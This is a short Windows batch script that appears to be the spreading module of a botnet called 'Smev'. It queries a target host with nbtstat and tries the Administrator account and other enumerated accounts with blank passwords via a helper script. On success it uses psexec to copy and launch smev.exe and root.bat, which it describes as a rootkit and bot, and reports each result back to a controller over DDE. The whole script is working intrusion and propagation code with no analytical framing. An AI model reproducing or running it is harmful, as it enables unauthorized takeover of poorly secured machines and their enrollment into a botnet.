@echo off
set username=
nbtstat -A %1 > %1.tmp
find "<20>" %1.tmp
IF ERRORLEVEL ==1 goto nothack
find "<03>" %1.tmp > u%1.tmp
call test.bat %1 Administrator
if .%username%==. for /f "skip=2" %%x in (u%1.tmp) DO call test.bat %1 %%x
if .%username%==. GOTO end

:root
dde Smev command null /scan %1 = Vulnerable, Uploading Rootkit.
psexec \\%1 -u %username% -p "" -c -f -d smev.exe
psexec \\%1 -u %username% -p "" -c -f -d root.bat | find "started" > nul
if ERRORLEVEL ==1 goto error

dde Smev command null /scan3 Bot successfully uploaded/started on %1

goto end

:error
dde Smev command null /scan3 %1 -- Error Loading Rootkit!
goto end
:nothack
dde Smev command null /scan2 %1 -- Not Vulnerable
goto end
:end
dde Smev command null /nexthost
del %1.tmp
del u%1.tmp